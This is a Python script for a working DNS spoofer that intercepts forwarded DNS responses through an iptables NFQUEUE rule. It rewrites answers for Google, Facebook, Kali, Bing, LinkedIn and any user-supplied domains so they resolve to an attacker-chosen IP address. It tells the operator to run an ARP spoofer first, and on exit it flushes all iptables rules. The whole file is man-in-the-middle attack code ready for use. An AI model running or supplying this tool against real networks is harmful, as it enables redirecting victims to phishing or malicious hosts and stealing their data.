#!/usr/bin/python3
import ipaddress
import scapy.all
import time
from colorama import Fore, Back, Style
import subprocess
import netfilterqueue
dns_hosts = [b'www.google.com', b'google.com.', b'www.facebook.com.', b'facebook.com.', b'kali.org.', b'www.kali.org.', b'bing.com.', b'linkedin.com.', b'www.linkedin.com.']
ip = ''

def main_dns():
    print(f'{Fore.BLUE}Welcome To DNS Spoofer{Style.RESET_ALL}')
    try:
        print(f'{Fore.YELLOW}[***] Please Start Arp Spoofer Before Using this Module [***] {Style.RESET_ALL}')
        redirect_data()
        add_host_in_list()
        print(f'{Fore.GREEN}[++] Intercepting requests .... [++]{Style.RESET_ALL}')
        define_queue_iptable()
    except KeyboardInterrupt:
        reset_setting()
        time.sleep(3)

def ipv4_check(string):
    try:
        ipaddress.IPv4Network(string)
        return True
    except:
        return False

def redirect_data():
    while True:
        ip_redirect = input('[+] Please Enter the ip address where you want to rediect the target [-]  :  ')
        if ipv4_check(ip_redirect):
            global ip
            ip = ip_redirect
            break
        else:
            print(f'{Fore.RED}[*] Please enter a valid ip address [*]{Style.RESET_ALL}')

def add_host_in_list():
    URl = input('[+] Please Enter the url to spoof (seperate by blank) : ')
    URl = URl.split()
    for x in URl:
        temp = bytes(x + '.', 'utf-8')
        dns_hosts.append(temp)
    print(f'{Fore.GREEN}[*] Spoofing url ==> ')
    print(f'{Fore.BLUE}{dns_hosts}{Style.RESET_ALL}')

def define_queue_iptable():
    queue_number = '99'
    subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', queue_number])
    queue = netfilterqueue.NetfilterQueue()
    try:
        queue.bind(99, process_packet)
        queue.run()
    except KeyboardInterrupt:
        reset_setting()

def process_packet(packet):
    try:
        scapy_packet = scapy.all.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.all.DNSRR):
            query = scapy_packet[scapy.all.DNSQR].qname
            print('--------------------')
            print('[+] Intercept request for ====> ', query.decode())
            print(scapy_packet.summary())
            if query in dns_hosts:
                print(f'{Fore.GREEN}[*]Spoofing URl For ', query.decode())
                print('[*] Before Modification')
                print(scapy_packet.summary())
                answer = scapy.all.DNSRR(rrname=query, rdata=ip)
                scapy_packet[scapy.all.DNS].an = answer
                scapy_packet[scapy.all.DNS].ancount = 1
                del scapy_packet[scapy.all.IP].len
                del scapy_packet[scapy.all.IP].chksum
                del scapy_packet[scapy.all.UDP].len
                del scapy_packet[scapy.all.UDP].chksum
                packet.set_payload(bytes(scapy_packet))
                print('[*] After Modification')
                print(f'{scapy_packet.summary()}{Style.RESET_ALL}')
            print('--------------------')
        packet.accept()
    except KeyboardInterrupt:
        return

def reset_setting():
    print(f'{Fore.YELLOW}\n[*] Resetting Ip Tables [*]')
    subprocess.call(['iptables', '--flush'])
    print(f'\n[+] Exiting...{Style.RESET_ALL}')
main_dns()
